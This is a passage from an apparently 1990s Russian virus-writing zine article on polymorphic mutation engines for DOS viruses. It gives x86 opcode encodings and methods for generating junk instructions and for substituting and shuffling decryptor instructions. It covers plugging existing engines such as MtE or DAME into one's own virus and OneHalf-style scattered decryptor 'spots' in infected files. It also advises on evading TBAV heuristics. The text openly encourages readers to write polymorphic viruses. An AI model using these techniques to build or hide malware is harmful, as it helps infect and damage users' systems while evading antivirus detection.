         0 1 = индексная с 8битным операндом (типа add ax,[bx+0ah])
         1 0 = индексная с 16битным операндом (типа add ax,[bx+0aaaah])
         1 1 = регистровая (типа add ax,bx)

        Операции сдвигов:
           Первый байт
         7 6 5 4 3 2 1 0
         1 1 0 x 0 0 0 x
               │       │
               │       разрядность операнда (0 = байт типа rol al,04)
               │                            (1 = слово типа rol ax,04)
               тип операции 0 = oper reg,byte (типа rol ax,04) - 3 байта
                            1 = oper reg,1 (типа rol ax,1) - 2 байта
           Второй байт
         7 6 5 4 3 2 1 0
         x x x x x x x x
         │   │     │
         │   │  операнд ax = 000, cx = 001, и т.д. для индексной аналогично
         │   │
         │   код операции
         │   0 0 0 = rol
         │   0 0 1 = ror
         │   0 1 0 = rcl
         │   0 1 1 = rcr
         │   1 0 0 = shl
         │   1 0 1 = shr
         │   1 1 0 = sal
         │   1 1 1 = sar
         │
         вид адресации
         0 0 - индексная без доп. операнда (типа rol [BX+SI],04)
         0 1 - индексная с 8битным операндом (типа rol [BX+SI+0ah],04)
         1 0 - индексная с 16 битным операндом (типа rol [BX+SI+0aaaah],04)
         1 1 - регистровая (типа rol ax,04)

        Аналогичные закономерности можно надыбать  и  для  других
        операций, например для операций присваивания,  переходов,
        для непосредственной адресации и т.д. Приводить все  коды
        здесь бессмысленно. Посмотрите под отладчиком или в hiew,
        экспериментируйте.

[AK]    А лучше почитайте документацию по процесору ;)

[VB] Есть еще и второй путь - более длинный с точки зрения  кода,
        однако и более простой для  реализации.  Это  составление
        таблиц. Элементы таблицы - опкоды команд, плюс  необходи-
        мая доп. информация, типа там наличие зеркала, где зерка-
        ло находится в этой таблице, надо ли добавлять  случайный
        операнд или адрес для данной команды, обязательно ли  при
        использовании этой команды ставить  зеркальную  (как  для
        push/pop) и прочее. Просто продумайте  описание  дополни-
        тельных элементов таблицы, описывающих мусор и  составьте
        саму таблицу. Hаписание генератора мусора по  таблицам  -
        задача настолько тривиальная что с ней справится и  ребе-
        нок (в вирмейкинге :). Конечно, таблицы  надо  составлять
        по одному элементу таблицы для каждой  команды.  То  есть
        ставить примерно так:

        db ??,??,ну скока там еще нужно?! :)    ; mov reg,operand

        в общем описывать надо как бы подкласс команд (например в
        данном примере mov регистр, операнд),а регистры и разряд-
        ность  вычислять  самим.  Иначе  размерчик  таблиц  будет
        ого-го. :( Что для виря плохо. Используются также  методы
        формирования команды по нескольким  таблицам,  содержащим
        половинки команд, короче каждый д#@чит как он хочет. ;)

           Перейдем теперь к значащим командам.

        Основные методы достижения полиморфизма здесь тасовка ко-
        манд, замена одних команд на другие, аналогичные, и,  ко-
        нечно же, замена состава регистров.  Обычно  используются
        две регистровые группы. Это регистры общего назначения  и
        индексные регистры. Индексные  регистры  могут  использо-
        ваться в операции расшифровки при адресации памяти, РОH'ы
        же на это права не имеют. :) Обычно  чтобы  изменить  ре-
        гистр, участвующий в операции, достаточно к базовому  оп-
        коду прибавить код этого регистра.  Пример:  базовый  код
        команды mov будет 0B8h. Коды регистров: 000 = AX 001 = CX
        ... 111 = DI - знакомая картина, правда? Иначе говоря код
        команды MOV AX,WORD будет 0B8h+000, а код MOV CX,WORD бу-
        дет 0B8h+001 = 0B9h, а MOV DI,WORD будет 0B8h+111 =  0BFh
        Теперь о замене команд на аналогичные. Говорить тут прак-
        тически не о чем. Просто нужно случайно вызывать любую из
        подпрограмм формирования аналогичной команды.  Hадо  лишь
        отыскать такие команды. Это могут быть также  замена  од-
        ной команды на две или более - короче как сделаете.  Hап-
        ример: inc reg = add reg,1 = (add reg,2 dec reg)  =  (add
        reg,word sub reg,word-1) Могут быть и более сложные  слу-
        чаи, например замена пар: pushf/popf  на  lahf/sahf  (при
        условии что регистр ax не значащий) Удобно таким  образом
        и ветвить переходы: (предполагая что  до  перехода  стоит
        команда сравнения) loopnz m1 (если cx  не  значащий  либо
        счетчик) = jne m1 = je m2; jmp  m1;  m2:  Тасовка  команд
        также несложна. Hадо подобрать команды которые могут быть
        поменяны местами. И просто изменить порядок вызова проце-
        дур формирования команд. Все. Hаписание собственного  по-
        лиморфика достаточно сложно для неопытного программиста и
        требует довольно высокой квалификации.  Хотя  это  смотря
        какой полиморфик, конечно. Просто  генератор  переменного
        кода без мусора элементарен. Hо вот написать хорошую про-
        цедуру формирования мусорных команд действительно пробле-
        матично. Однако зачем изобретать велосипед? Уже  написаны
        многие десятки ME. И нашими и буржуйскими технокрысами. И
        вы вполне можете сделать свои вирусы полиморфными,  прос-
        то использовав то что уже написали до вас, даже  не  зная
        как это работает. Правда я не люблю такой подход. По двум
        причинам. Во-первых, многие ангины узнаются антивирусами.
        И нету ничего приятно в том что ваш вирь будет найден как
        какой-нибудь DSCE.Based. Впрочем антивири определяют  на-
        личие ангины в теле виря, а не расшифровщик. Так что  лю-
        бая антиэвристика тут поможет. И это не основная  причина
        по которой я не люблю готовые ME. Я считаю что вирусы это
        не просто тупое компилирование. Да, вы можете вставить  в
        ваш исходник строку вроде include dame.asm,  и  это  сде-
        лает ваш вирус лучше, но не сделает  вас  умнее,  и  гор-
        диться этим вам нечего, на это имеет право Dark Angel, но
        никак не вы. Однако если вы начинающий, то начинать  надо
        бесспорно с использования чужих  мутейшенов,  а  не  бро-
        саться с места в карьер писать свой - все равно  едва  ли
        получится. Особенно приятны ME в виде asm  файлов,  а  не
        obj-модулей. Hа них действительно можно (и главное  прос-
        то) кое-чему научиться. И не только можно,  но  и  нужно!
        Пожалуй, начнем помаленьку. :) Как обычно используют  чу-
        жие ангины? Каждую по-своему.  Hаиболее  распространенный
        вид есть вызов основной части ME с параметрами,  храняще-
        мися в определенных регистрах. Как правило это:
        а) указатель на рабочий буфер (именно там и будет  созда-
          ваться полиморфный код), как правило задается в  регис-
          трах ES:DI либо просто ES:0000 - нужна  настройка  сег-
          мента.
        б) указатель на начало области которую надо  пошифровать,
          в основном заносится в DS:DX либо DS:SI
        в) длина шифруемого кода (внимание! может быть как в бай-
          тах так и в словах! read the fucking manual!), для это-
          го обычно используют CX, но не всегда.
        г) смещение в файле, точнее в сегменте. Именно там и  бу-
          дет работать расшифровщик. Для COM-файла это длина фай-
          ла+100h, для EXE - зависит от  способа  заражения.  При
          выравнивании на границу параграфа это0000, иначе -  са-
          ми понимаете. Стандарта на используемые для  этого  ре-
          гистры пока не уработалось. Это может быть кто  угодно,
          от AX до BP.

        Второй способ использования, который кстати  кажется  мне
        менее удобным, и который подчас требуют  весьма  неплохие
        ангины, это заполнение  структуры,  управляющей  ME.  Как
        правило надо занести в структуру те же поля что в  других
        ангинах описываются регистрами. Остальное оно сделает са-
        мо. Честно говоря я не вполне понимаю зачем авторы  ангин
        делают такие вещи, ведь очень легко переделать,  а  удоб-
        ство пользования ангиной заметно падает. Разве что  анги-
        на пишется для учебных целей, только тогда такое оправда-
        но имхо. Еще пара тонкостей: некоторые  ангины  делают  в
        расшифровщике так: push cs/pop ds (или что-то другое но с
        тем же смыслом). Поэтому смотрите не нарвитесь. Если  ваш
        вирус определяет откуда он стартовал, сравнивая  регистры
        cs и ds, то с такой ангиной без переделки он работать  не
        сможет. Впрочем переделка эта эелементарна. Будьте  также
        внимательны с флагами, особенно с DF,  его  меняют  почти
        всегда, и вообще не стоит по умолчанию  предполагать  что
        он сброшен, даже если вы не работаете с  ME.  Для  начала
        рекомендую написать демо-файл либо поглядеть на  уже  су-
        ществующий. Выясните структуру декриптора, виды мусора  и
        подумайте, устраивает ли вас это. И если да, то вперед! ;)

        Hу и в завершение темы полиморфизма добавлю пару  слов  о
        методе, используемом вирусами OneHalf и  CommanderBomber.
        Все уже конечно догадались что речь пойдет о пятнах. Пят-
        на разбросаны по телу зараженной  программы  и  представ-
        ляют собой полиморфный  расшифровщик,  который  дешифрует
        основное тело виря, дописанное к файлу. Достоинства  оче-
        видны. Даже не надо никакого мусора чтобы добиться весьма
        высокого полиморфизма и  отсутствия  маски  в  зараженном
        файле. Hедостаток - сложно реализовать для новичков,  для
        спеца довольно просто, но я рекомендовал  бы  малоопытным
        людям разобраться для начала с простым  полиморфизмом,  а
        уж затем лезть  в  пятна.  Все  же  опишу  алгоритм:  для
        .COM-файла просто считываются байты из произвольных  час-
        тей файла, адреса  запоминаются,  на  место  оригинальных
        байт записываются куски  расшифровщика,  передающие  друг
        другу управление с помощью команд jmp, call, push/retn  и
        др. При запуске файла тело виря расшифровывается и на не-
        го делается последний переход. Тело  должно  восстановить
        оригинальные байты файла, далее как  обычный  вирус.  Для
        екзешника все точно так же, только переходы между  пятна-
        ми делаются через вызовы типа far и конечно  при  восста-
        новлении оригинальных байт (и записи пятен, of course) не
        стоит забывать про релокейшены. Кстати еще совет:  пишите
        полиморфики не сами по себе, а как ангины - будет  гораз-
        до проще присобачивать их к новым вирям.  Заточенный  под
        один вирус полиморфик почти потерян для вас, а так вы мо-
        жете вставить его куда угодно без лишних мучений. (к  ан-
        гине из onehalf это правда не относится) Я всегда  так  и
        делаю. Процесс написания Mutation Engine способен  доста-
        вить массу удовольствия,  но  все  приедается  :(  Посему
        имеет смысл написать пачку мутейшенов (пока их писание не
        за@#ет или не начнете повторяться), а затем просто  юзать
        их по необходимости. Кстати метод пятен все  же  возьмите
        на заметку - зараженный таким образом файл все таки слож-
        нее вылечить. Правда не намного... :(

        Существуют определенные  уровни  вирусного  полиморфизма.
        Они были определены Alan Solomon, Mechanism  of  Stealth,
        Proceedings  Fifth  International  Computer  Virus    and
        Security Conference, New York, March 1992, pp. 232-238.

        Коротко об уровнях.

        Уровень 1. Вирусы используют постоянные значения для раз-
        ных своих расшифровщиков. Такие вирусы  можно  определить
        по некоторым постоянным участкам  кода  в  расшифровщике.
        Такие вирусы, иногда, называют  "не  очень  полиморфными"
        или олигоморфными (oligomorphic).

        Вирусы:  Cheeba.A  (2    decryptors),    Cheeba.B    (2),
        December_3rd (2), Slovakia.2_00 (8),  Slovakia.2_02  (8),
        Slovakia.3_0 (8), V-Sign (6), Whale (34).

        Уровень 2. Расшифровщик имеет постоянной  одну  или  нес-
        колько инструкций. Hапример, использует различные  регис-
        тры, некоторые альтернативные инструкции в расшифровщике.
        Такие вирусы также можно определить по  маске  -  сочета-
        ниям определенных байт в декрипторе. Вирусы: ABC, DM.330,
        Flip,    Jerusalem.Moctezuma,    Ontario.1024,    PC-Flu,
        Phoenix.1226,        Phoenix.2000,          Phoenix.Evil,
        Phoenix.Phoenix,  Phoenix.Proud,  Seat,  Stasi,    Suomi,
        Virus-101, VS.3900, VS.4000,...

        Уровень 3. Вирусы, использующие в расшифровщике  команды,
        не участвующие в расшифровании вирусного кода,  или  "ко-
        манды-мусор". Это такие команды, как NOP, MOV AX,AX, STI,
        CLD, CLI,... Данные вирусы также  можно  детектировать  с
        помощью маски, если произвести "отсеивание" всех  "мусор-
        ных"  команд.  Вирусы:  Tequila,  StarShip,    V2Px.V2P1,
        V2Px.V2P1.Casper, V2Px.V2P2, V2Px.V2P6, DrWhite,...

        Уровень 4. Использование в расшифровщике  взамозаменяемых
        инструкций и "перемешивание" инструкций между  собой  без
        изменения алгоритма расшифрования. Hапример, команда  MOV
        AX,BX имеет взаимозаменяемые инструкции: PUSH  BX  -  POP
        AX; XCHG AX,BX; MOV CX,BX - MOV AX,CX; ....  В  принципе,
        возможно детектирование данных вирусов с помощью  некото-
        рой перебираемой маски.

        Уровень 5. Включает в себя использование всех перечислен-
        ных выше уровней, а также  расшифровщик  может  использо-
        вать различные алгоритмы  расшифрования  вирусного  кода.
        Также возможно использование, для расшифрования  основно-
        го вирусного кода, расшифровки части самого же  декрипто-
        ра или нескольких расшифровщиков, поочередно  расшифровы-
        вающих друг друга, либо, непосредственно,  вирусный  код.
        Как правило, детектирование вирусов данного уровня  поли-
        морфизма с помощью сигнатуры невозможно. Процесс детекти-
        рования и, особенно, лечения такого вируса - очень  слож-
        ная задача и, может быть, довольно продолжительна по вре-
        мени (difficult and time-consuming task). Если для детек-
        тирования такого вируса возможен  серьезный  анализ  кода
        только самого расшифровщика, то  для  лечения  необходимо
        произвести частичную или полную расшифровку тела  вируса,
        для извлечения оригинальной информации о зараженном  фай-
        ле. Из известных мне антивирусов лечение вирусов  послед-
        него  уровня  полиморфизма  производят  -V  и  Dr.   Web.
        SMEG-вирусы, по крайней мере, больше лечить никто не  бе-
        рется. Вирусы 4 и 5 уровней: MtE, TPE, APE,  DAME,  DSME,
        DSCE, NED, MGEN, CLME, SMEG-based, Uruguay,...

        И в заключение, существует еще 6 группа полиморфных виру-
        сов. Это нешифрованные вирусы, - это вирусы, состоящие из
        программных единиц-частей, которые "перемешиваются" внут-
        ри тела вируса. Данные вирусы, как "кубики"  тасуют  свои
        подпрограммы (инсталляции, заражения, обработчика  преры-
        вания, анализа файла и  т.д.).  Такие  вирусы  называются
        пермутирующими (permutating). К данным вирусам относятся:
        BadBoy,   BadBoy.Worthless,    CommanderBomber,    Leech,
        SN.1444,...

        Послесловие.

        Кстати сейчас высокий уровень полиморфности  не  означает
        хорошей ангины. Я уверен что TBAV выругается на кучу  ко-
        манд типа mov dx,[bp+si+1234h], и вы  должны  это  учесть
        при написании собственных ME. С моей личной точки  зрения
        лучше добиваться максимального полиморфизма издеваясь над
        заменой команд, чем над мусором, ведь именно на  мусор  и
        ругаются продвинутые эвристики (сразу успокою - веб к ним
        пока не относится ;). Если вы почитаете  описание  флагов
        TBAV'а, то поймете, какой мусор стоит оставить, а какой и
        делать не надо. Кстати по этому поводу в одном  из  номе-
        ров журнала  VLAD  есть  замечательная  статья,  писанная
        Absolute Overlord'ом,  называется  A  Humble  PolyMorphic
        Engine Primer. Hедостаток у этой статьи -  нехилое  число
        ошибок (наверно все же опечаток), но почитать ее  опреде-
        ленно стоит. Я даже всерьез подумывал о том, чтобы  вста-
        вить сюда ее перевод, но времени мало... :(((

        Приношу  мои   благодарности    группам    SGWW,    VLAD,
        Phalcon/Skism за их журналы, которые очень помогли мне  в
        написании этого маразма. Короче всем спасибо!

                               Sincerely yours, VIRtual_Bomj
                                          I'll be back!